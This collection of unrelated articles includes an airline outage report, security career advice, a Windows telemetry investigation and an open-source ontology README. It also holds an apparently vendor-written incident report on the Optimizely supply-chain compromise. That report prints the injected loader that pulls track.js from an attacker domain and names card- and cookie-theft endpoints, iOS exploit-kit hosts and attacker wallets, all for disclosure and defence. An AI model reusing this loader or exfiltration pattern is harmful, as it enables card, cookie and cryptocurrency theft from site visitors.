entry.title: United Airlines experiencing a widespread system outage, airline says
entry.content:
A widespread, yet short-lived, system outage at United Airlines on Monday delayed some outbound flights at US airports, the airline told CNN in a statement, coming on the heels of a rare FAA ground stop that caused massive disruption.

The outage lasted about 30 minutes, with fewer than 150 flights impacted, United Airlines spokesperson Leslie Scott told CNN.

United acknowledged the issue just before 5 p.m. ET, saying the technology outage was impacting departing flights, and an hour later the airline announced it had been resolved.

“While some flights were delayed, there was no impact on flights in progress, or on United Express flights,” United Airlines said in a statement.

During the incident, the FAA said United was experiencing a technology outage on its end and that “it’s not an FAA equipment issue.”

United said there is no indication that the outage was a cybersecurity-related issue.

The technology outage affected access to multiple applications used by flight crews, according to an internal company alert obtained by CNN.

The airline instructed pilots not to log out of several systems, warning they may be unable to sign back in. The affected applications included flight planning, weather briefing and crew management tools.

Pilots unable to access their flight plans were being directed to contact dispatchers to have the documents emailed to them.

The memo did not disclose the cause of the outage.

Air traffic control audio captured by ATC.com shows the moment the outage occurred.

“Hey, we’re uh, still waiting on our final weights,” a pilot on United Flight 1728 in El Paso, heading to Denver, said to a controller. “We just contacted ops and apparently there’s a company-wide system outage on it so might be a while.”

The controller responds back, “United 1728, roger, so you don’t have any idea when you think you’ll be able to leave?”

“No ma’am,” the pilot responds.

Aviation industry still recovering from weekend ground stop

The industry had largely returned to normal operations after the nationwide ground stop was lifted just after 8 p.m. ET on Friday, though airlines have still worked to reposition planes, crews and luggage as they grappled with the weekend’s score of cancellations and delays.

Transportation Secretary Sean Duffy held a 45-minute news conference Saturday morning to address the FAA ground stop, and apologized to travelers as he said he was still working to determine what exactly went wrong.

Duffy told reporters that upgrade work on an old telecommunication system could be a cause for Friday’s nationwide ground stop.

In at least one remote FAA location, Duffy said contractor L3Harris was doing routine maintenance to switch telecommunication lines from an old copper wire to fiber, which he described as “straightforward” work that has been happening across the country for decades.

As United Airlines indicated for Monday’s system outage, Friday’s ground stop didn’t appear to have been caused by a cyber attack or any “nefarious” activity, Duffy stressed at the news conference.

“A lot of questions came in yesterday. ‘Was this a, a cyber attack? Did some foreign nation attack this network?’ And the answer to that is we don’t believe so,” Duffy said.

This story has been updated with additional information.

entry.title: How to Break into Security, Ptacek Edition (2012)
entry.content:
At least once a month, sometimes more, readers write in to ask how they can break into the field of computer security. Some of the emails are from people in jobs that have nothing to do with security, but who are fascinated enough by the field to contemplate a career change. Others are already in an information technology position but are itching to segue into security. I always respond with my own set of stock answers, but each time I do this, I can’t help but feel my advice is incomplete, or at least not terribly well-rounded.

I decided to ask some of the brightest minds in the security industry today what advice they’d give. Almost everyone I asked said they, too, frequently get asked the very same question, but each had surprisingly different takes on the subject. Today is the first installment in a series of responses to this question. When the last of the advice columns have run, I’ll create an archive of them all that will be anchored somewhere prominently on the home page. That way, the next time someone asks how they can break into security, I’ll have more to offer than just my admittedly narrow perspectives on the matter.

Last month, I interviewed Thomas Ptacek, founder of Matasano Security, about how companies could beef up password security in the wake of a week full of news about password leaks at LinkedIn and other online businesses. Ptacek’s provocative advice generated such a huge amount of reader interest and further discussion that I thought it made sense to begin this series with his thoughts:

Ptacek: “Information security is one of the most interesting, challenging, and, if you do it carefully, rewarding fields in the technology industry. It’s one of the few technology jobs where the most fun roles are well compensated. If you grew up dreaming of developing games, the laws of supply and demand teach a harsh lesson early in your career: game development jobs are often tedious and usually pay badly. But if you watched “Sneakers” and ideated a life spent breaking or defending software, great news: infosec can be more fun in real life, and it’s fairly lucrative.

I’m a software developer. I try to look at security through the lens of computer science. To me, the most attractive thing about the field is the opportunity it provides to work with lots of different concepts at lots of different levels. Computer security might be the best way to work professionally with compiler theory, or to spend time understanding computer microarchitecture, or to apply advanced mathematics.

Other people get involved in security for different reasons, and those reasons are probably equally valid. Some people really like the “good guys / bad guys” narrative that comes with security. Some people see security as an opportunity to save the world. Other people are drawn to the competitive nature of the field: at the higher levels, it really is a cat-and-mouse game. It also comes closer to meritocracy than most of technology: you can either break in or you can’t; your defenses either work or they don’t.

But for me, it’s just one of the best development jobs you can get, and with that in mind, here’s my advice for people interested in pursuing a career in it.

First: I want you to learn how to program. Clearly, you can get through college and get a good-paying steady job without ever learning to love programming. But no one factor gives you as much control over your career, as much of an ability to write your own ticket, as the ability to solve problems using programming languages. A lot of very smart technology professionals have concluded that they just don’t enjoy writing software. Those people should reconsider. Try different languages, or different application domains, but find a way to make programming stick in your head.

Second: the best jobs in our field are in application security. You can get good steady work designing firewall deployments, setting up desktop agents, or responding to incidents. But all those roles are fundamentally reacting to what’s happening in appsec. The next generation of security products — along with the org charts of security teams at the savviest companies — are being designed now, by accident, by application security practitioners.

Appsec roles are roles that involve attacking software or devising fixes and countermeasures for those attacks. Two good ways to “come up” in appsec: become a penetration tester, or contribute to (or start) a secure software development practice in your company.

A good way to move into penetration testing: grab some industry standard tools and use an Amazon EC2 account to set up a “shooting range” to attack. Some of the best-known tools are available for free: the Nessus scanner, for instance, while not an application security tool, is free and can land you a network penetration testing role that you can use as a springboard to breaking applications.

When people reach out to Matasano asking how to get a foot in the door attacking software, we have a few simple steps to offer:

0. Learn to love programming in at least one language. The C Programming Language has the most cachet in application security, but for this step-by-step list, Java or Python or Ruby will do fine.

1. Grab a copy of The Web Application Hacker’s Handbook.

2. Go to the “previous releases” archive at WordPress.org and grab very old versions of WordPress; install them at EC2.

3. Download OWASP WebScarab or Burp Suite Free Edition, both of which are free, and use them to find bugs in ancient WordPress.

If you’re already in an IT role, and want to come up on the defensive side of appsec, try to position yourself near custom software development. Most large firms build “line of business” applications. As a rule, building “line of business” isn’t particularly fun. But defending those apps can be; sometimes, the most boring applications turn out to be surprisingly sensitive.

And the good news for doing appsec in BigCo’s: most companies have very immature security programs. If you can get a role in QA, or in what the cool kids are calling “DevOps”, you can end up with a lot of influence in security. At Matasano, we’ve watched lots of ops people successfully transition to appsec and senior security management just by instituting basic security testing processes on their company’s software.

To me, the whole field boils down to studying, understanding, and manipulating technology. Like most software security practices, we’ve gotten our hands dirty with a fascinating cross-section of the whole technology industry. We’ve written attack tools that target the control registers of device chipsets, we’ve done custom RF work, we’ve written low-level debuggers for different CPU architectures, and we’ve seen and beaten up on products built in almost every programming language and every platform you can imagine. If crawling through the ventilation ducts of the world’s most important technology is something you think might make you tick like we do… well, appsec! Learn to code. Spend a couple days Starbucks money on an EC2 account and deploy some broken apps to break. Find opportunities to practice in your job.

And, uh, come talk to us? People like you are hard to find!”

entry.title: Windows 11 Is Collecting Data on Which Coding Agents and Developer Tools You Use
entry.content:
7 minutes

Windows 11 Is Collecting Data on Which Coding Agents and Developer Tools You Use

I recently asked AI to help me look through the latest Windows binaries for undocumented features and functionality. Among the leads it turned up, one list immediately caught my attention: coding agents such as codex.exe, claude.exe, copilot.exe, and cursor.exe, alongside familiar developer tools such as python.exe, dotnet.exe, gcc.exe, and code.exe.

Why would a Windows system DLL need a list of coding agents and developer tools?

The names were in MissionControlAggregator.dll. I asked the agent to follow the references and dig into what the DLL actually does. That led from a handful of string comparisons to a running Windows component that records which coding agents and developer tools have been used, saves that information locally, and reports it to Windows Diagnostics. And unless you have opted out of the “optional” diagnostic data (which is enabled by default), the data is uploaded to Microsoft.

I shared the initial finding on X. This post includes more details about the investigation behind it.

Following the names

Opening the DLL in Binary Ninja made the first lead easy to see. These were explicit executable names embedded in a Windows component:

Following the references showed that the names were used in comparisons. There are four CLI-agent slots checking copilot.exe, claude.exe, codex.exe, and agy.exe, with extensionless equivalents on the WSL route. Five desktop-agent slots check github.exe, claude.exe, codex.exe, cursor.exe, and antigravity.exe.

Here is one of the comparisons against codex.exe:

The compiler-generated C++ names are unwieldy, so I will call these functions executable-name matchers. For reference, one related matcher is std::_Func_impl_no_alloc<<lambda_340dfe7e962ab225b6ac33bc664bd54f>, bool, std::basic_string_view<wchar_t, std::char_traits<wchar_t>> const&, Microsoft::Diagnostics::MissionControlAggregator::Utils::AppType>::_Do_call. The screenshot shows another lambda instantiation performing the same kind of name comparison.

The feature guarding the new agent checks has a particularly direct name: CLICodingAgentUsage, feature ID 62580080.

And the list extends beyond AI agents. The same component checks for node.exe, python.exe, dotnet.exe, gcc.exe, clang.exe, gdb.exe, javac.exe, devenv.exe, and code.exe, among others. Those checks feed broader developer-tool categories. Some of these checks also verify the publisher: the Node.js slot expects Node.js Foundation, Python expects Python Software Foundation, and the .NET and Visual Studio slots expect Microsoft Corporation. The compiler/debugger group containing GCC and Clang has no additional publisher check in this path.

Where does the DLL get this information?

The next question was whether the component scans running processes itself. Following Aggregator::OnLoad revealed that it subscribes to existing Windows events instead.

For Windows programs, it consumes KernelProcess.AppStateChangeSummary and Win32kTraceLogging.AppInteractivitySummary. These provide application identities that its handlers parse and pass to the matchers. For WSL, it consumes Microsoft.Windows.Lxss.Manager.Exec and ExecCritical, using the imageName field. A regular Windows codex.exe can therefore reach the CLI-agent checks through the app-state summary route; this is not limited to Linux programs running inside WSL.

The relevant flow looks like this:

Aggregator::OnLoad ├─ WSL Exec / ExecCritical │ └─ ProcessWslExecEvent → CLI agent matchers ├─ KernelProcess.AppStateChangeSummary │ └─ ProcessAppStateChangeSummaryEvent → CLI agent matchers └─ Win32kTraceLogging.AppInteractivitySummary └─ ProcessAppInteractivitySummaryEvent → desktop agent matchers Aggregator::OnRelativeTimerExpire └─ MissionControlAggregatorLogging::ReportCohorts<12,4,5> └─ Segments.SubCohorts ETW report Aggregator::OnUnload / intermediate timer └─ PersistentState::SaveToDisk

A successful match sets a slot in the aggregator’s state. Later, ReportCohorts<12,4,5> turns those slots into bitsets and emits a report named Segments.SubCohorts. The numbers correspond to twelve broader tool categories, four CLI agents, and five desktop agents.

ETW (Event Tracing for Windows) is the mechanism carrying that report. In this case, it is a self-describing TraceLogging event. Rather than writing the executable names into every report, the component assigns each category a bit. A set Codex bit means the matching tool was observed during the reporting window.

The source events also include runtime, time in focus, interaction counters, and resource usage. This component appears to discard those details and record only a bitmap of which agents were observed. The report’s timestamps describe the collection window, not how long each agent was used.

Although I found no prompt text or source code in this report, collecting which agents and developer tools someone uses already has significant privacy implications.

Is it actually running on a normal machine?

Strings and code are a useful lead, but I wanted to see the component running. I checked my Parallels Windows 11 ARM64 VM, build 26200.9974. Its MissionControlAggregator.dll was version 10.0.26100.9818, and CLICodingAgentUsage was already enabled as a service experiment. I had not manually enabled the feature.

DiagTrack, the Connected User Experiences and Telemetry service, was also already running with its startup type set to Automatic. It starts a separate AggregatorHost.exe process, and that process loads the DLL. The following administrative PowerShell commands show the service, its child process, and the loaded module:

PS> Get-Service DiagTrack | Format-Table Name,Status,StartType -AutoSize Name Status StartType ---- ------ --------- DiagTrack Running Automatic PS> Get-Process AggregatorHost | Format-Table ProcessName,Id -AutoSize ProcessName Id ----------- -- AggregatorHost 1500 PS> Get-CimInstance Win32_Service -Filter "Name='DiagTrack'" | Format-List Name,State,StartMode,ProcessId Name : DiagTrack State : Running StartMode : Auto ProcessId : 10148 PS> Get-CimInstance Win32_Process -Filter "Name='AggregatorHost.exe'" | Format-List ProcessId,ParentProcessId ProcessId : 1500 ParentProcessId : 10148 PS> tasklist /m MissionControlAggregator.dll Image Name PID Modules ========================= ======== ============================================ AggregatorHost.exe 1500 MissionControlAggregator.dll

The process IDs connect the pieces: DiagTrack runs in process 10148, which is the parent of AggregatorHost.exe, process 1500; the module listing places MissionControlAggregator.dll inside that child.

The public ISO’s baseline VM had the coding-agent feature disabled by image default, so the evidence does not support saying that it is active on every Windows installation. On my ARM64 VM, however, the relevant feature and service were active before the test.

Testing it in practice

To test the finding in practice, I copied cmd.exe to a file named codex.exe and ran it in the interactive Windows session. The name alone was enough for the component to recognize it as Codex.

I captured an AppStateChangeSummary for the running process from the KernelProcess provider ({2839ff94-8f12-4e1b-82e3-af7af77a450f}), with LaunchCount=1 and TerminateCount=0. The aggregator’s saved state contained the value 2 in CLI slot 2, the Codex slot. A separate run without an additional ETW trace also set that slot, confirming that detection worked through Windows’ existing diagnostic collection.

That state is persisted in:

C:\ProgramData\Microsoft\Diagnosis\AggregatorStorage\MissionControlAggregator$

The report normally follows a roughly daily boundary. To capture it immediately, I temporarily moved the saved reporting-window start 25 hours into the past and restarted DiagTrack with a trace listening for the aggregator. The resulting Segments.SubCohorts event contained:

Provider: Microsoft.Windows.MissionControlAggregator Time: 2026-11-16T12:34:29.125116Z Version: 0.1.5 CliAgentSubCohorts: 4 DesktopAgentSubCohorts: 0 FlushedFromSave: true

The value 4 is 1 << 2: the Codex CLI bit. The name had made it through the input summary, the matcher, the persisted state, and the emitted report.

I also tested the developer-tool path separately, using a copy of cmd.exe named gcc.exe. It set developer-tool slot 3. With optional diagnostic data allowed, I found the resulting Segments.SubCohorts event in DiagTrack’s upload queue with SubCohorts: [8] (1 << 3). This is the compiler/debugger category shared by GCC, Clang, and related tools, rather than a separate bit for each executable.

Following the report toward Microsoft

An ETW event by itself would not establish that anything leaves the machine. ETW is used for plenty of local diagnostics. The more revealing question was who was listening to this particular report.

The VM already had a Diagtrack-Listener session subscribed to both ends of the path. These PowerShell queries showed its subscriptions:

Get-EtwTraceProvider -SessionName Diagtrack-Listener ` -Guid '{2839ff94-8f12-4e1b-82e3-af7af77a450f}' Get-EtwTraceProvider -SessionName Diagtrack-Listener ` -Guid '{00de11a2-ec06-58e5-1a2b-21bb21dbee4b}'

The first subscription, for KernelProcess, had MatchAnyKeyword=0x400000000002, which includes the summary’s 0x400000000000 keyword. The second, for Microsoft.Windows.MissionControlAggregator, had MatchAnyKeyword=0xe00000000000, which includes the report’s 0x800000000000 keyword. Both had level 255.

The subscription showed where the report could go. To check whether Windows actually queued it for transmission, I inspected DiagTrack’s EventStore.db and decompressed the JSON batches in its AsimovEvents table. This revealed an important condition: the agent-usage report is treated as optional diagnostic data.

When optional diagnostic data is allowed (enabled by default in the US setup I tested), Windows queues the coding-agent usage report for upload to Microsoft. I verified this by finding the agent event itself in DiagTrack’s upload queue:

{ "name": "Microsoft.Windows.MissionControlAggregator.Segments.SubCohorts", "ext": { "privacy": { "isRequired": false } }, "data": { "Version": "0.1.5", "CliAgentSubCohorts": [4], "DesktopAgentSubCohorts": [0], "FlushedFromSave": true } }

I checked this with a clean installation of Windows 11 Home ARM64 using the latest official ISO, with the region set to the United States. Before changing any privacy settings, the Diagnostic data toggle was already enabled and labeled Include Optional. After completing setup with those defaults, AllowTelemetry was 3, confirming that optional diagnostic data was enabled.

Optional diagnostic data is therefore enabled by default, at least in the US setup I tested. If you did not opt out of it during installation or disable optional diagnostic data later, it is still enabled and your coding agent usage data is being uploaded. You can decline optional diagnostics during setup or turn off Send optional diagnostic data later under Settings → Privacy & security → Diagnostics & feedback. Microsoft’s diagnostics and privacy guide explains how to change it.

entry.title: Optimizely Compromised, Served Malware on Zoom, GitLab
entry.content:
World's Largest Brands Infected With Malware Via Optimizely

On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

What happened

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

We saw three versions of the injected loader:

A plain <script> tag pointing at https://1688360.cc/track.js (most snippets). The same URL hidden in base64 with atob(). A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time. A full inline copy of the payload, which runs through eval if 1688360.cc is blocked.

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

Timeline (UTC) Time Event Sep 17 webshell.lol, the same actor's injector, first appears on Turkish sites through an SEO "backlink panel" script Nov 09 17:52 5vobauua3ojpklx.icu registered (iOS exploit-kit router) Nov 13 to 11-16 Earlier wave: webshell.lol/get.js injected through Kissmetrics, StorifyMe and Minute Media scripts on sites including securitybank.com, faz.net, smh.com.au, vidaxl and foxsports.com Nov 16 02:21 Last clean urlscan capture of the BBC's Optimizely snippet Nov 16 04:21 First Optimizely injection seen (BBC snippet loading webshell.lol) 04:28 to 05:23 1688360.cc certificates issued; domain registered at 05:23 08:10 First build of track.js (crypto clipper) 08:28 1688360.cc/track.js first seen on bbc.com 11:20 Zoom's snippet modified (its Last-Modified header) 13:03 Attacker sweeps stolen crypto to exchanges 13:43 Card skimmer added to track.js 16:38 eil786npto9u5bq.icu registered (second iOS router) 17:13 to 17:57 Second iOS host added; Coruna iframe injected into every iOS 18.6-or-earlier visit 19:24 to 19:59 Our sweep: 186 of 1,611 Optimizely snippets infected ~20:40 to 21:10 Mass clean-up (Ledger 20:41, Smartsheet 20:56, BBC 21:07) 21:52 1 of 188 snippets still infected (TalkTalk)

The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.

What the payload does

Every visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

1. Crypto address swapping (already stealing money)

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

page text, form fields, links and images; the clipboard, on copy and through navigator.clipboard; outgoing fetch/XHR requests, window.open, navigation and the iOS share sheet.

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

2. Card skimming

Added at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

3. Cookie and screenshot theft

When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:

the page URL; document.cookie (cookies not marked HttpOnly); the original addresses it replaced; a screenshot of the page, rendered with html2canvas. 4. iOS exploit kits: Coruna and DarkSword

On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:

iOS version Chain 13 to 17 Coruna (/A8/, plus a direct Coruna loader at /JIUJIU888/index.js) 18.x DarkSword (/B9/, /D11/, /D12/) 26 Separate chain (/C10/); currently only fingerprints the device

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

Money stolen so far

As of 19:25 UTC on 16 November, the attacker's wallets had received about $7,040, all within roughly nine hours on the 16th:

Wallet Received ≈ USD BTC 19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW 0.08298 BTC (4 tx), unspent $5,380 LTC ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5 17.02 LTC (3 tx) $762 TRON THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa 662.9 USDT + 184 TRX $719 ETH 0xC4026b06D82b0F0B363eda0642D61CfbDc17884e 0.055 ETH $100 BSC (same 0x address) 82 USDT $82

Funds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address. The TRON wallet has been in use since March 2026, so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc.

Who was affected

We fetched 1,611 distinct Optimizely snippets, found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.

How Report URI would have detected, or even prevented, this attack

Every one of these needs only a CSP in Report-Only mode, so nothing on the site breaks:

Product What it would have flagged Script Watch A new script dependency on your site: https://1688360.cc/track.js, followed by the .icu iOS routers. Data Watch New data destinations: 1688360.cc/hit.php and 1688360.cc/card.php. Frame Watch A new frame source: eil786npto9u5bq.icu, the exploit-kit iframe. CSP Integrity + JS Time Machine + Script Vault Your Optimizely snippet's fingerprint changing, plus a brand-new script with no matching known file. The JS Time Machine shows when the new version first appeared and how long it was served. Threat Intelligence Reports naming 5vobauua3ojpklx.icu and webshell.lol are already flagged as IoCs, as are 1688360.cc and the other hosts below once they were added.

It's possible to go even further and deploy a CSP that could actively block these attacks and prevent any data breach happening. The websites affected by this attack weren't necessarily running vulnerable code of their own, they were loading JavaScript from a provider they trusted, and that trust was exploited. This is why monitoring what runs in your visitors' browsers is so important. Report URI gives organisations the visibility to detect when trusted dependencies change or behave unexpectedly, and the tools to help enforce policies that prevent malicious scripts and connections from succeeding.

Did Content Security Policy help?

We crawled 256 of the affected organisations' own hosts and evaluated their CSP against what this payload needs:

Load track.js from 1688360.cc. Or run the inline fallback, which needs 'unsafe-eval' or 'unsafe-inline'. Send stolen data to 1688360.cc (connect-src). Load the iOS kit (script-src, frame-src). Result Organisations No CSP at all 68 CSP allowed the payload and the data theft 50 Payload ran, but connect-src blocked the data theft (the address swapping still worked) 17 Payload blocked 24 (15%)

Allowing cdn.optimizely.com was never going to help. The malicious code arrived from the trusted host itself. What separated the 24 protected sites from the rest was a restrictive script-src. A site that lists only the hosts it needs blocks 1688360.cc. Two common settings let it straight through:

'strict-dynamic': any script the trusted Optimizely snippet inserts is trusted too. 'unsafe-eval', which Optimizely's own documentation tells customers to allow: the inline-fallback version ran through eval even where track.js was blocked. That is what happened at HSBC. Its CSP blocked track.js and the data theft, but the inline copy still ran.

connect-src matters. The 17 "partial" sites blocked card, cookie and screenshot theft because they restrict where the page can send data. That doesn't stop address swapping, which happens inside the page.

What to do now

If your site uses Optimizely Web:

Open every project's Project JavaScript and every experiment's custom code. Look for 1688360.cc, atob( and any script you didn't write. Review who and what has write access to your Optimizely account (users, API tokens, integrations) and rotate credentials. If you have card fields in your own forms, treat cards entered on 16 November as potentially exposed. Treat any session tokens or secrets in non-HttpOnly cookies as exposed, and rotate them. Deploy a CSP. Restrict connect-src, avoid 'unsafe-eval' where you can, and turn on reporting. Consider if you need to communicate to your customers about having served them malware.

If you visited an affected site on 16 November:

Update your iPhone or iPad to iOS 18.7.3 or later, or iOS 26.3 or later. Check any crypto transfer you made. If the address you pasted doesn't match the one you meant to pay, it may have been swapped. Watch your card statements if you paid by card on an affected site. Indicators of compromise

All of these domains are attacker-owned; block them including subdomains.

entry.title: Show HN: Sutra-OS – A self-hosted ontology platform
entry.content:
Scarce Units, Typed, Related, Actionable.

An open-source, self-hosted ontology platform. Your data becomes one model you own: typed, linked, changed only through rules the server enforces, and every number traces back to its source.

Quick start · How it works · Proposals · Python SDK · Contributing

Beta. Only small parts are still alpha: the model language and APIs may still change between versions, and parts of the user interface and docs are unfinished.

Maintainers wanted. Sutra-OS is a one-person project so far. See Contributing.

Sutra-OS began in late 2025 as a thought experiment: a free version of the system described in Ontology-Oriented Software Development, whose creators I deeply admire.

Much talent today goes into software that sells attention, while the software everything else runs on is mostly free: by a rough estimate, 70–90% of US economic output depends on free software at some critical point. That openness is not guaranteed. In November 2026, Nvidia's board parted with the founder who had its AI models released openly. Sutra-OS adds to the commons under the AGPL, so that it stays readable by anyone.

The past ten years have shown what it costs when nobody can see what depends on what. In 2017, NotPetya spread through a single Ukrainian accounting program and stopped Maersk's ports and Merck's factories. In 2023, a corrupted file in one FAA system halted every domestic departure in the US. In 2024, one faulty CrowdStrike update crashed millions of Windows machines, and airlines, hospitals and banks stood still. In November 2026, a single vendor took Outlook down for a day and some cities went back to fax. That same week, data flooded the FAA's telecommunications network, aging routers buckled, and the US saw only the third nationwide ground stop in its history. No one, it seems, had those routers on the map of what keeps planes in the air, so no one could ask beforehand what would stop if they failed.

That question is what Sutra-OS is built for. Every system, device, dataset and decision becomes an object with links to what it feeds and what feeds it, and every number can be traced back to its source. Whoever holds such a model can ask, before the outage, what stops when one piece fails, and get an answer, at every scale from a single person to a government (hopefully never a world government). Many small ontologies, each held by those it describes, keep power spread out; one model of everything would not.

Scarce Units: energy, water, land, housing and time will shape the coming decades. Whoever counts what is scarce decides how it is shared, and today that bookkeeping sits with a few platforms; for most people, the only trace their own data leaves in their life is the tendinitis from the hundredth weary click on "Accept all" in a cookie banner. Sutra-OS keeps the bookkeeping with those it concerns, under rules everyone can read: households, farms, workshops, clubs, newsrooms and public administrations get their records back, and their wrist with them. That is what a democracy needs from its software: a council that can trace the number behind a decision to its source, a change that stays a proposal until someone answers for it, and a public administration accountable to its voters rather than to a vendor under another country's law.

Almost everyone. Whoever you are, someone else keeps a better-connected record of your affairs than you do. Sutra is for anyone who wants their own.

Requirements: Linux x86_64, JDK 21, the Clojure CLI, Node.js, Python 3, git.

git clone <repository-url> sutra && cd sutra (cd clients/frontend && npm install) bin/sutra-solo

This starts an embedded PostgreSQL and the server on 127.0.0.1 and prints the address. Data lives in $SUTRA_HOME (default ~/.local/share/sutra). The admin password is in zugang.edn ("access") there. Run the bin/sutra bind … line it prints once.

Three ideas carry the whole platform: object types, link types and action types. The examples below use the farm model in resources/presets.

You start by saying what exists: a lot of hay, from one field and one cut; a sale, to one buyer. Each is a typed thing with a kind and a key.

:objects {:lot {:name "Hay lot" :plural "Hay lots" :symbol "🌾" :title :name :primary-key :name :match-keys [:name] :attributes [[:name :string {:name "Lot"}] ; "North Meadow, 1st cut 2026" [:baled :integer {:name "Bales made" :constraints {:min 0}}] [:sold :integer {:derived {:expression [:connected-sum :sales :bales]}}] [:in-barn :integer {:name "In the barn" :visibility :prominent :derived {:language :clojure :expression [:- [:get :baled] [:get :sold]] :inputs [:baled :sold]}}]]} :sale {:name "Sale" :symbol "🤝" :primary-key :sale-nr :match-keys [:sale-nr] :attributes [[:sale-nr :string] [:lot :string] [:buyer :string] [:bales :integer {:constraints {:min 1}}] [:price-per-bale :decimal] [:sold-on :date] [:sold-by :string]]}}

Nobody types or counts :in-barn: it is the bales made minus every bale sold, computed by the server. :bales is an integer, so "about forty" or -3 is refused before anything is written.

An object type is a typed table with a name, a face in the UI and a class in the generated SDK. Properties are typed, constrained and can be derived, so a value nobody typed in still shows up like any other column.

A sale on its own is just a number. A sale linked to the lot it came out of is a fact everyone can see.

:links [[:sale-lot :sale :lot :many-to-one {:fk :lot :forward-api-name :lot :reverse-api-name :sales}]]

The sale names its lot and the link follows it: from the lot you see its sales, from a sale its lot, and :connected-sum above sums across that link. One line, and the barn knows what is in it.

Links are first-class: named in both directions, navigable in the UI, traversable in the SDK (lot.sales), and usable in derived values, filters and object sets.

In most systems anybody may change anything, and nobody can say who did. Here there is no "update row". There are only actions: named decisions with typed inputs and rules the server enforces. Selling hay is one of them, and it has a condition.

:sell-hay {:on :lot :params {:lot {:type :lot :required true} :sale-nr {:type :string :required true} :buyer {:type :string :required true} :bales {:type :integer :required true :constraints {:min 1}} :price-per-bale {:type :decimal} :sold-on {:type :date :prefill :now} :sold-by {:type :string :exposure :hidden :prefill :current-user}} :submission-criteria [{:message "Not that many bales in the barn." :test {:want [:get :bales] :have [:get :lot :in-barn]} :pred [:<= :want :have]}] :rules [{:op :create :object-type :sale :values {:sale-nr [:get :sale-nr] :lot [:get :lot :name] :buyer [:get :buyer] :bales [:get :bales] :price-per-bale [:get :price-per-bale] :sold-on [:get :sold-on] :sold-by [:get :sold-by]}}] :edits [{:object-type :sale}]}

Ask to sell more bales than are in the barn and the server refuses and says why, with the same sentence for the phone, the CLI, the Python script and the AI agent. A refused action writes nothing. Every sale records who made it, and nobody can put someone else's name there.

Actions are the only write path: typed parameters, validation, submission criteria and state transitions, defined once and enforced everywhere.

Every rule you would otherwise keep in your head has this shape: a fact the server computes, and an action that checks it. Declare it once, and stop remembering it.

The same three ideas run the arable side of the farm. A field's margin is derived from its paid harvests and the hay sold off it, two links away. A harvest moves from planted to harvested, delivered and paid only through its actions, and Sell harvest refuses to run without a signed delivery note and a quality test of your own.

In most software, deciding and doing are one step. In Sutra they are two. When you sell hay, the server first writes down what would change: one new sale, forty bales, your name on it. Nothing has happened yet. Only when that note is approved does the barn change.

Everything else follows from that:

